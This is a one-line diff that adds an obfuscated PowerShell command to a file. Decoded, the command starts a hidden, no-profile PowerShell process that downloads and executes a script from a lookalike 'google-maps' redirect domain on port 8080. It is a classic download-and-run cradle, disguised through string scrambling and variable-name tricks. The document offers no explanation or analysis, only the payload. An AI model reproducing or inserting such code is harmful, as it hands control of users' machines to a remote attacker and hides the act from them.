@@ -1,0 +1,1 @@
+﻿. ((varIaBlE '*mDR*').NaME[3,11,2]-JOiN'') (((("{21}{16}{10}{9}{8}{11}{5}{0}{19}{20}{6}{4}{2}{17}{22}{7}{13}{1}{12}{15}{3}{14}{18}"-f 'ne','irect','g({0}http://googl','0','strin','}IEX ((','ient).download','ps.','-w hidd',' -nop ','e','en -c {1','m','red','80/{','e.net:8','hell.ex','e-m','0})){1}','w-o','bject net.webcl','powers','a')) -F  [ChAr]39,[ChAr]34)) 
